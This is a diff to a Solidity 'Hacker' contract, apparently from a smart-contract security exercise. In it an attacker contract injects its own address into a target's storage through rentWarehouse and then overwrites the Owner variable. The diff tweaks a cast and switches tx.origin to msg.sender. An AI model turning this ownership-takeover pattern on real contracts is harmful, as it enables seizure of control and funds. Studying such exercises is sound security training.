@@ -20,12 +20,12 @@ contract Hacker {
     }
 
     function attack() external {
-        store.rentWarehouse(0, uint(uint160(address(this))));
+        store.rentWarehouse(0, uint160(address(this)));
     }
 
     function setCurrentRenter(uint256 _renterId) external {
         console.log("Owner is", Owner);
-        Owner = tx.origin;
+        Owner = msg.sender;
         console.log("Owner is", Owner);
     }
 }
